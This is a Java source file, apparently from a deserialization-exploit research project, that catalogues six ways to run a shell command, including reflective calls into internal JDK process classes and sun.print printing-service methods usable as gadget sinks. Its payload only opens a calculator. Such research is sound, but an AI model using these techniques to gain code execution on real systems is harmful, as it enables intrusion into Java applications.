package xyz.eki.marshalexp.solution;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import sun.print.UnixPrintService;
import sun.print.UnixPrintServiceLookup;
import xyz.eki.marshalexp.gadget.jdk.GUnixPrintService;
import xyz.eki.marshalexp.utils.ReflectUtils;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.lang.reflect.Type;
import java.util.Arrays;
import java.util.Map;

public class RCEWays {
    public static String cmd = "Open -a Calculator.app";
    public static void case1() throws Exception{
        Runtime.getRuntime().exec(cmd);
    }

    public static void case2() throws Exception{
        new ProcessBuilder(new String[]{"/bin/bash","-c",cmd})
                //.environment()
                //.directory()
                .start();
    }

    public static void case3() throws Exception{
//        new ProcessImpl.start(cmdarray,
//                environment,
//                dir,
//                redirects,
//                redirectErrorStream);
        Class<?> ProcessImpl = Class.forName("java.lang.ProcessImpl");
        Method start = ProcessImpl.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        start.setAccessible(true);
        start.invoke(null,new String[]{"/bin/bash","-c",cmd},null,null,null,false);
    }

    public static void case4() throws Exception{
        /**
         *     UNIXProcess(final byte[] prog,
         *                 final byte[] argBlock, final int argc,
         *                 final byte[] envBlock, final int envc,
         *                 final byte[] dir,
         *                 final int[] fds,
         *                 final boolean redirectErrorStream)
         */
        Class<?> UnixProcess = Class.forName("java.lang.UNIXProcess");
//        Constructor<?> constructor = UnixProcess.getConstructor(byte[].class,
//                byte[].class,int.class,
//                byte[].class,int.class,
//                byte[].class,
//                int[].class,
//                boolean.class
//        );
//        Constructor<?> constructor = ReflectUtils.getFirstCtor(UnixProcess);
        Constructor<?> constructor = UnixProcess.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        byte[] argBlock = String.format("-c\00%s",cmd).getBytes();
        constructor.newInstance("/bin/bash".getBytes(),
                argBlock,argBlock.length,
                null,0,
                null,
                new int[]{-1,-1,-1},
                false
        );
    }

    public static void case5() throws Exception{
        UnixPrintService exp = GUnixPrintService.getter2RCE(cmd);
        Method getPrinterIsAcceptingJobsAIXMethod = UnixPrintService.class.getDeclaredMethod("getPrinterIsAcceptingJobsAIX",null);
        getPrinterIsAcceptingJobsAIXMethod.setAccessible(true);
        getPrinterIsAcceptingJobsAIXMethod.invoke(exp,null);
    }

    public static void case6() throws Exception{
        Method execCommand = UnixPrintServiceLookup.class.getDeclaredMethod("execCmd", String.class);
        execCommand.setAccessible(true);
        execCommand.invoke(null,cmd);
    }

    public static void main(String[] args) throws Exception{
        case6();
    }
}
